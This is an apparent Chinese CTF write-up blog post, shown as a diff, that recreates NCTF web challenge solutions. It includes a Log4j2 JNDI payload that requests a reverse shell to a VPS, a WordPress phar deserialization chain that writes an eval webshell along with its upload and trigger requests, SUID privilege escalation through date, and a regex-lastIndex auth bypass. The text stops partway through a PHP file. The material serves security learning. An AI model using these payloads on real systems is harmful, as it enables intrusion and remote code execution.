@@ -1,0 +1,242 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>NCTF复现 | Rem_1st</title><meta name="author" content="Rem_1st,2586474557@qq.com"><meta name="copyright" content="Rem_1st"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="此次比赛0解，需要学习的地方很多，很多都是没有涉及到的地方，对于Java安全的部分学习要加快了 logging这题算是一道签到题，这里涉及到了Log4j2漏洞利用和JNDI注入，都是没有学过的，从头来。JNDI注入部分在这，这道题是关于Log4j2的CVE-2021-44228漏洞的一些利用，如这个https:&#x2F;&#x2F;www.cnblogs.com&#x2F;loongten&#x2F;p&#x2F;15822195.html下面">
+<meta property="og:type" content="article">
+<meta property="og:title" content="NCTF复现">
+<meta property="og:url" content="http://pzb-creator.github.io/NCTF%E9%83%A8%E5%88%86%E5%A4%8D%E7%8E%B0/index.html">
+<meta property="og:site_name" content="Rem_1st">
+<meta property="og:description" content="此次比赛0解，需要学习的地方很多，很多都是没有涉及到的地方，对于Java安全的部分学习要加快了 logging这题算是一道签到题，这里涉及到了Log4j2漏洞利用和JNDI注入，都是没有学过的，从头来。JNDI注入部分在这，这道题是关于Log4j2的CVE-2021-44228漏洞的一些利用，如这个https:&#x2F;&#x2F;www.cnblogs.com&#x2F;loongten&#x2F;p&#x2F;15822195.html下面">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://pzb-creator.github.io/img/avatar.png">
+<meta property="article:published_time" content="2023-12-26T06:15:51.000Z">
+<meta property="article:modified_time" content="2024-01-02T12:30:51.244Z">
+<meta property="article:author" content="Rem_1st">
+<meta property="article:tag" content="比赛复现">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://pzb-creator.github.io/img/avatar.png"><link rel="shortcut icon" href="/img/5.jpg"><link rel="canonical" href="http://pzb-creator.github.io/NCTF%E9%83%A8%E5%88%86%E5%A4%8D%E7%8E%B0/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"找不到您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: {"chs_to_cht":"你已切换为繁体中文","cht_to_chs":"你已切换为简体中文","day_to_night":"你已切换为深色模式","night_to_day":"你已切换为浅色模式","bgLight":"#49b1f5","bgDark":"#1f1f1f","position":"bottom-left"},
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'NCTF复现',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2024-01-02 20:30:51'
+}</script><script>(win=>{
+      win.saveToLocal = {
+        set: (key, value, ttl) => {
+          if (ttl === 0) return
+          const now = Date.now()
+          const expiry = now + ttl * 86400000
+          const item = {
+            value,
+            expiry
+          }
+          localStorage.setItem(key, JSON.stringify(item))
+        },
+      
+        get: key => {
+          const itemStr = localStorage.getItem(key)
+      
+          if (!itemStr) {
+            return undefined
+          }
+          const item = JSON.parse(itemStr)
+          const now = Date.now()
+      
+          if (now > item.expiry) {
+            localStorage.removeItem(key)
+            return undefined
+          }
+          return item.value
+        }
+      }
+    
+      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        script.onerror = reject
+        script.onload = script.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          script.onload = script.onreadystatechange = null
+          resolve()
+        }
+
+        Object.keys(attr).forEach(key => {
+          script.setAttribute(key, attr[key])
+        })
+
+        document.head.appendChild(script)
+      })
+    
+      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onerror = reject
+        link.onload = link.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          link.onload = link.onreadystatechange = null
+          resolve()
+        }
+        document.head.appendChild(link)
+      })
+    
+      win.activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+        if (t === 'dark') activateDarkMode()
+        else if (t === 'light') activateLightMode()
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+      const detectApple = () => {
+        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+          document.documentElement.classList.add('apple')
+        }
+      }
+      detectApple()
+    })(window)</script><meta name="generator" content="Hexo 7.0.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/avatar.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">3</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">2</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">2</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/preview.jpg')"><nav id="nav"><span id="blog-info"><a href="/" title="Rem_1st"><img class="site-icon" src="https://tse4-mm.cn.bing.net/th/id/OIP-C.79_M6DlTqN-kFLVj0XPRuQHaD7?w=327&amp;h=180&amp;c=7&amp;r=0&amp;o=5&amp;pid=1.7"/><span class="site-name">Rem_1st</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">NCTF复现</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-12-26T06:15:51.000Z" title="发表于 2023-12-26 14:15:51">2023-12-26</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2024-01-02T12:30:51.244Z" title="更新于 2024-01-02 20:30:51">2024-01-02</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/">比赛复现</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">3.1k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>12分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="NCTF复现"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><p>此次比赛0解，需要学习的地方很多，很多都是没有涉及到的地方，对于Java安全的部分学习要加快了</p>
+<h1 id="logging"><a href="#logging" class="headerlink" title="logging"></a>logging</h1><p>这题算是一道签到题，这里涉及到了Log4j2漏洞利用和JNDI注入，都是没有学过的，从头来。JNDI注入部分在这，这道题是关于Log4j2的CVE-2021-44228漏洞的一些利用，如这个<a target="_blank" rel="noopener" href="https://www.cnblogs.com/loongten/p/15822195.html%E4%B8%8B%E9%9D%A2%E6%98%AF%E9%A2%98%E8%A7%A3%E8%BF%87%E7%A8%8B%E3%80%82">https://www.cnblogs.com/loongten/p/15822195.html下面是题解过程。</a></p>
+<p>跟据出题人的提示，先在本地搭建环境，使用java编译运行.文件jar</p>
+<p><img src="/pic/6.png" alt="img"></p>
+<p>可以看到运行成功，然后在浏览器进去本地的80端口，可以看到搭起来了</p>
+<p><img src="/pic/7.png" alt="img"></p>
+<p>跟据hint可知，构造一个畸形的数据包可以使控制台报错，并且构造点可以在accept和host。这里我在accept头处进行一个伪造，通过bp抓到发送到repeater。修改accept为123，然后发送可以看到控制台处报错</p>
+<p><img src="/pic/8.png" alt="img"></p>
+<p><img src="/pic/9.png" alt="img"></p>
+<p>而log4j2是一个日志系统，用于处理日志信息，为了输出日志时能输出任意位置的java对象，引入了lookup接口，那么就有可能存在JNDI注入的利用。</p>
+<p>当处理日志时发现日志中有${}时，就会将里面的内容替换成真实内容，即通过lookup查找到的内容，那么我们就可以将里面替换成RMI或者LDAP协议内容完成注入。先使用rmi协议进行dnslog解析查看是否能被利用。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">在accept头中写入下面注入语句</span><br><span class="line">$&#123;jndi:ldap://dnslog的地址&#125;</span><br></pre></td></tr></table></figure>
+
+<p>如下</p>
+<p><img src="/pic/10.png" alt="img"></p>
+<p><img src="/pic/11.png" alt="img"></p>
+<p>可以看到dns完成了解析说明可以利用，那么剩下的就跟JNDI注入了，这里使用上面JNDI注入里的工具</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar JNDIExploit-1.4-SNAPSHOT.jar -i vps_ip -l 开放的端口</span><br></pre></td></tr></table></figure>
+
+<p>然后在bp里写入语句</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;jndi:ldap://vps_ip:ldap的端口/Basic/ReverseShell/vps_ip/反弹监听的端口&#125;</span><br></pre></td></tr></table></figure>
+
+<p>在vps里再另起窗口监听，然后bp发送，可以发现反弹成功，但我这里的环境有问题，连上了但是有问题无法执行命令</p>
+<h1 id="ez-wordpress"><a href="#ez-wordpress" class="headerlink" title="ez_wordpress"></a>ez_wordpress</h1><p>跟据提示先在kali上使用wpscan扫，做信息收集</p>
+<ul>
+<li>Wordpress的版本是6.4.1，网上有相应的pop链</li>
+<li>有插件all-in-one-video-gallery版本是2.6.4，有任意文件读取和SSRF漏洞</li>
+<li>contact-form-7，这里提供了文件上传功能，版本是5.8.4</li>
+<li>drag-and-drop-multiple-file-upload-contact-form-7，版本是1.3.6.2；也是文件上传的点。</li>
+</ul>
+<p>这题的做题思路是phar反序列化和SSRF</p>
+<p>利用drag-and-drop-multiple-file-upload-contact-form-7上传phar文件，然后使用phar伪协议读取其二进制内容，然后连接</p>
+<p>这里的phar文件构造如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">namespace </span><br><span class="line">&#123;</span><br><span class="line">    class WP_HTML_Token </span><br><span class="line">    &#123;</span><br><span class="line">        public $bookmark_name;</span><br><span class="line">        public $on_destroy;</span><br><span class="line">        </span><br><span class="line">        public function __construct($bookmark_name, $on_destroy) </span><br><span class="line">        &#123;</span><br><span class="line">            $this-&gt;bookmark_name = $bookmark_name;</span><br><span class="line">            $this-&gt;on_destroy = $on_destroy;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $a = new WP_HTML_Token(&#x27;echo \&#x27;&lt;?=eval($_POST[1]);?&gt;\&#x27; &gt; /var/www/html/shell.php&#x27;, &#x27;system&#x27;);</span><br><span class="line"></span><br><span class="line">    $phar = new Phar(&quot;phar.phar&quot;); </span><br><span class="line">    $phar-&gt;startBuffering();</span><br><span class="line">    $phar-&gt;setStub(&quot;GIF89A&lt;?php XXX __HALT_COMPILER(); ?&gt;&quot;);</span><br><span class="line">    $phar-&gt;setMetadata($a);</span><br><span class="line">    $phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;);</span><br><span class="line">    $phar-&gt;stopBuffering();</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>然后上传phar文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">POST /wp-admin/admin-ajax.php HTTP/1.1</span><br><span class="line">Host: 127.0.0.1:8012</span><br><span class="line">Accept: application/json, text/javascript, */*; q=0.01</span><br><span class="line">Accept-Language: en-GB,en;q=0.5</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">X-Requested-With: XMLHttpRequest</span><br><span class="line">Content-Type: multipart/form-data; boundary=---------------------------92633278134516118923780781161</span><br><span class="line">Content-Length: 657</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">-----------------------------92633278134516118923780781161</span><br><span class="line">Content-Disposition: form-data; name=&quot;size_limit&quot;</span><br><span class="line"></span><br><span class="line">10485760</span><br><span class="line">-----------------------------92633278134516118923780781161</span><br><span class="line">Content-Disposition: form-data; name=&quot;action&quot;</span><br><span class="line"></span><br><span class="line">dnd_codedropz_upload</span><br><span class="line">-----------------------------92633278134516118923780781161</span><br><span class="line">Content-Disposition: form-data; name=&quot;type&quot;</span><br><span class="line"></span><br><span class="line">click</span><br><span class="line">-----------------------------92633278134516118923780781161</span><br><span class="line">Content-Disposition: form-data; name=&quot;upload-file&quot;; filename=&quot;test.jpg&quot;</span><br><span class="line">Content-Type: image/jpeg</span><br><span class="line"></span><br><span class="line">&#123;&#123;file(/Users/exp10it/payload.phar)&#125;&#125;</span><br><span class="line">-----------------------------92633278134516118923780781161--</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>然后使用伪协议读取触发反序列化</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">GET /index.php/video/?dl=&#123;&#123;base64(phar:///var/www/html/wp-content/uploads/wp_dndcf7_uploads/wpcf7-files/test.jpg/test.txt)&#125;&#125; HTTP/1.1</span><br><span class="line">Host: 127.0.0.1:8012</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>然后到&#x2F;var&#x2F;www&#x2F;html&#x2F;shell.php下连接shell，但是没有权限读取flag，需要suid提权。</p>
+<p>suid是一种权限设置，允许用户在执行特定程序时以该程序的所有者的权限运行。当用户执行具有SUID位的可执行文件时，该进程将获得文件所有者的权限而不是执行进程的用户的权限。如果一个可执行文件设置了SUID位，这意味着当任何用户运行该文件时，它将具有文件所有者的权限，而不是运行它的用户的权限。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -user root -perm -4000 -print 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
+
+<p>上面命令是用来查找系统中所有属主为 <code>root</code> 且设置了 SUID 位的文件，并将它们的路径打印出来</p>
+<p><img src="/pic/12.png" alt="img"></p>
+<p>可以看到date<a target="_blank" rel="noopener" href="https://gtfobins.github.io/gtfobins/date/#file-read">date | GTFOBins</a></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">date</span> -f /flag</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="Wait-What"><a href="#Wait-What" class="headerlink" title="Wait What?"></a>Wait What?</h1><p>这题是一个登录，并且以admin用户登录可以看到flag，那么就是如何使自己能以admin身份进入。我们可以进行注册，登录和封禁功能。由于admin被放入了禁止登录的名单内，所以我们要进行一个绕过</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">let banned_users = []</span><br><span class="line">// 你不准getflag</span><br><span class="line">banned_users.push(&quot;admin&quot;)</span><br><span class="line"></span><br><span class="line">app.post(&quot;/api/flag&quot;, requireLogin, (req, res) =&gt; &#123;</span><br><span class="line">    let username = req.body.username</span><br><span class="line">    if (username !== &quot;admin&quot;) &#123;</span><br><span class="line">        res.send(&quot;登录成功，但是只有&#x27;admin&#x27;用户可以看到flag，你的用户名是&#x27;&quot; + username + &quot;&#x27;&quot;)</span><br><span class="line">        return</span><br><span class="line">    &#125;</span><br><span class="line">    //...</span><br><span class="line"> &#125;)</span><br></pre></td></tr></table></figure>
+
+<p>下面是封禁功能的代码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">// 基于正则技术的封禁用户匹配系统的设计与实现</span><br><span class="line">let test1 = banned_users_regex.test(username)</span><br><span class="line">console.log(`使用正则$&#123;banned_users_regex&#125;匹配$&#123;username&#125;的结果为：$&#123;test1&#125;`)</span><br><span class="line">if (test1) &#123;</span><br><span class="line">    console.log(&quot;第一个判断匹配到封禁用户：&quot;,username)</span><br><span class="line">    res.send(&quot;用户&#x27;&quot;+username + &quot;&#x27;被封禁，无法鉴权！&quot;)</span><br><span class="line">    return</span><br><span class="line">&#125;</span><br><span class="line">// 基于in关键字的封禁用户匹配系统的设计与实现</span><br><span class="line">let test2 = (username in banned_users)</span><br><span class="line">console.log(`使用in关键字匹配$&#123;username&#125;的结果为：$&#123;test2&#125;`)</span><br><span class="line">if (test2)&#123;</span><br><span class="line">    console.log(&quot;第二个判断匹配到封禁用户：&quot;,username)</span><br><span class="line">    res.send(&quot;用户&#x27;&quot;+username + &quot;&#x27;被封禁，无法鉴权！&quot;)</span><br><span class="line">    return</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>可以看到有俩个waf，一个是正则匹配，另一个是in。</p>
+<p>第二个基于in的关键词waf，由于这个不是python而是js，而js中的关键词in如果指定的属性在指定的对象中就会返回true，而banned_users属于数组，而数组中不存在admin属性，所以test2实际是判断banned_users中是否存在数组索引为username的值(由于对象的属性名称会被隐式转换为字符串，”0”和0都可以作为数组索引)，所以0 in [‘admin’]或者‘0’ in [‘admin’]都会返回true，所以这是个假的waf</p>
+<p>第一个waf是一个正则表达式，使用了regex.test()函数，由于test()函数源码里面定义了g的全局变量[<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/86384322">源码级解析]分析并解决JavaScript里RegExp类中test()方法结果不固定的情况 - 知乎 (zhihu.com)</a>，如果正则表达式设置了全局变量，那么连续执行test()方法，则下一个test方法的起始匹配位置从上一个test的末位置lastindex后面开始</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&gt; let r = /^admin$/g</span><br><span class="line"></span><br><span class="line">&gt; r.lastIndex</span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">&gt; r.test(&quot;admin&quot;)</span><br><span class="line">true</span><br><span class="line"></span><br><span class="line">&gt; r.lastIndex</span><br><span class="line">5</span><br><span class="line"></span><br><span class="line">r.test(&quot;admin&quot;)</span><br><span class="line">false</span><br><span class="line"></span><br><span class="line">&gt; r.lastIndex</span><br><span class="line">0</span><br></pre></td></tr></table></figure>
+
+<p>但是在app.use()中</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">// 每次请求前，更新封禁用户正则信息</span><br><span class="line">app.use(function (req, res, next) &#123;</span><br><span class="line">    try &#123;</span><br><span class="line">        build_banned_users_regex()</span><br><span class="line">        console.log(&quot;封禁用户正则表达式（满足这个正则表达式的用户名为被封禁用户名）：&quot;,banned_users_regex)</span><br><span class="line">    &#125; catch (e) &#123;</span><br><span class="line">    &#125;</span><br><span class="line">    next()</span><br><span class="line">&#125;)</span><br><span class="line">let banned_users_regex = null;</span><br><span class="line">function build_banned_users_regex() &#123;</span><br><span class="line">    let regex_string = &quot;&quot;</span><br><span class="line">    for (let username of banned_users) &#123;</span><br><span class="line">        regex_string += &quot;^&quot; + escapeRegExp(username) + &quot;$&quot; + &quot;|&quot;</span><br><span class="line">    &#125;</span><br><span class="line">    regex_string = regex_string.substring(0, regex_string.length - 1)</span><br><span class="line">    banned_users_regex = new RegExp(regex_string, &quot;g&quot;)</span><br><span class="line">&#125;</span><br><span class="line">function escapeRegExp(string) &#123;</span><br><span class="line">    return string.replace(/[.*+?^$&#123;&#125;()|[\]\\]/g, &#x27;\\$&amp;&#x27;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>会发现每次请求都会产生一个新的banned_users_regex，使得lastindex的位置恢复为0，但是如果能在赋值之前抛出异常即可绕过这个更新，如果在try里面build_banned_users_regex抛出异常则无法阻止更新，但是如果这个方法里面传入escapeRegExp(string)的参数不是string则会抛出typeerror错误，就可以引发错误阻止更新</p>
+<p>所以具体做法就是先随便注册一个用户然后登录，然后访问&#x2F;api&#x2F;ban_user封禁用户，但是用户名得是对象，数组或者其他非string数据类型引发错误，然后访问&#x2F;api&#x2F;flag(用admin用户)正则匹配，test()的lastindex移到admin之后，然后再一次访问&#x2F;api&#x2F;flag即可拿到flag</p>
+<h1 id="Webshell-Generator"><a href="#Webshell-Generator" class="headerlink" title="Webshell Generator"></a>Webshell Generator</h1><p>填写method和key后抓包发送可以看到返回了生成的webshell.php的文件绝对路径以及写入的内容是一句话，那么这里就可以使用任意文件下载，可以得到download.php，index.php以及generate.sh文件内容。</p>
+<p>download.php文件内容</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">download.php:</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if(isset($_GET[&#x27;file&#x27;]) &amp;&amp; isset($_GET[&#x27;filename&#x27;]))&#123;</span><br><span class="line">    $file = $_GET[&#x27;file&#x27;];</span><br><span class="line">    $filename = $_GET[&#x27;filename&#x27;];</span><br><span class="line">    header(&quot;Content-type: application/octet-stream&quot;);</span><br><span class="line">    header(&quot;Content-Disposition: attachment; filename=$filename&quot;);</span><br><span class="line">    readfile($file);</span><br><span class="line">    exit();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>可以看出会读取文件内容</p>
+<p>index.php部分内容</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">security_validate();</span><br><span class="line">if (@$_POST[&#x27;method&#x27;] &amp;&amp; @$_POST[&#x27;key&#x27;] &amp;&amp; @$_POST[&#x27;filename&#x27;]) &#123;</span><br><span class="line">    if ($_POST[&#x27;language&#x27;] !== &#x27;PHP&#x27;) &#123;</span><br><span class="line">        die(&quot;PHP是最好的语言&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    $method = $_POST[&#x27;method&#x27;];</span><br><span class="line">    $key = $_POST[&#x27;key&#x27;];</span><br><span class="line">    putenv(&quot;METHOD=$method&quot;) or die(&quot;你的method太复杂了！&quot;);</span><br><span class="line">    putenv(&quot;KEY=$key&quot;) or die(&quot;你的key太复杂了！&quot;);</span><br><span class="line">    $status_code = -1;</span><br><span class="line">    $filename = shell_exec(&quot;sh generate.sh&quot;);</span><br><span class="line">    if (!$filename) &#123;</span><br><span class="line">        die(&quot;生成失败了！&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    $filename = trim($filename);</span><br><span class="line">    header(&quot;Location: 